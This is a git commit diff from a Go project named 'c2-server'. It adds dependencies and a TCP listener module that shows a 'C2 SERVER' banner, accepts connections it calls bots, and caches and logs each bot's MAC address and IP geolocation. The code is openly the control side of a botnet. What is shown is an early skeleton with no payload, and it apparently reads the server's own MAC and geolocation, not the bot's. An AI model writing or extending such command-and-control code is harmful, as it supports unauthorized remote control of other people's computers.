882c4134cd5ce7f1e213996703537bb9dc18b734
Артём Власов <aworkprogramm@gmail.com>
2025-04-20 00:16:13 +0500

    Created new release v0.2.x -> main branch (#2)
    * added scripts install and auto-start.go
    
    * added cache, start server, get ipgeo and ...

--- go.mod
+++ go.mod
@@ -1,3 +1,10 @@
 module c2-server
 
 go 1.23.0
+
+require (
+	github.com/joho/godotenv v1.5.1 // indirect
+	github.com/json-iterator/go v1.1.12 // indirect
+	github.com/modern-go/concurrent v0.0.0-20180228061459-e0a39a4cb421 // indirect
+	github.com/modern-go/reflect2 v1.0.2 // indirect
+)
---
+++ modules/modules.server.go
@@ -0,0 +1,85 @@
+package modules
+
+import (
+	"c2-server/config"
+	"c2-server/constants"
+	"c2-server/lib"
+	"c2-server/types"
+	"fmt"
+	"net"
+	"time"
+)
+
+type TCPServer struct {
+	host   string
+	port   int
+	cache  *lib.Cache
+	logger *lib.Logger
+}
+
+func NewTCPServer(cache *lib.Cache) *TCPServer {
+	return &TCPServer{
+		host:   config.ServerRemoteAddr,
+		port:   config.ServerRemotePort,
+		cache:  cache,
+		logger: lib.NewLogger(),
+	}
+}
+
+func (this *TCPServer) StartServer() error {
+	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", this.port))
+	if err != nil {
+		return fmt.Errorf("Error starting server: %v", err)
+	}
+	defer listener.Close()
+
+	fmt.Println("\n" + ` ██████╗   ██╗    ██████╗    ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
+██╔════╝   ██║   ██╔════╝    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
+██║     ████████╗██║         ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
+██║     ██╔═██╔═╝██║         ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
+╚██████╗██████║  ╚██████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
+ ╚═════╝╚═════╝   ╚═════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
+                                                                              `)
+
+	this.logger.Info(fmt.Sprintf("Server started %s:%d", this.host, this.port))
+
+	for {
+		conn, err := listener.Accept()
+		if err != nil {
+			this.logger.Error(fmt.Sprintf("Error accepting connection: %v", err))
+			continue
+		}
+
+		go this.handleConnectionCallback(conn)
+	}
+}
+
+func (this *TCPServer) handleConnectionCallback(conn net.Conn) {
+	defer conn.Close()
+
+	buffer := make([]byte, constants.MAX_PACKET_SIZE)
+
+	n, err := conn.Read(buffer)
+	if err != nil {
+		fmt.Println(err.Error())
+		this.logger.Info(fmt.Sprintf("Error reading data: %s", conn.RemoteAddr()))
+		return
+	}
+
+	this.handleBot(conn, buffer[:n])
+}
+
+func (this *TCPServer) handleBot(conn net.Conn, data []byte) {
+	defer func() {
+		this.cache.RemoveCache(lib.GetMAC())
+		this.logger.Info(fmt.Sprintf("Bot disconnect: %s", conn.RemoteAddr()))
+	}()
+
+	mac := lib.GetMAC()
+	ipgeo := lib.GetIPGeo()
+
+	this.cache.NewInitial(mac)
+	this.cache.SetCache(mac, "ipgeo", ipgeo, 10*time.Minute)
+
+	this.logger.Info(fmt.Sprintf("CONNECTED: %s:%d", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP, conn.RemoteAddr().(*net.TCPAddr).Port))
+}
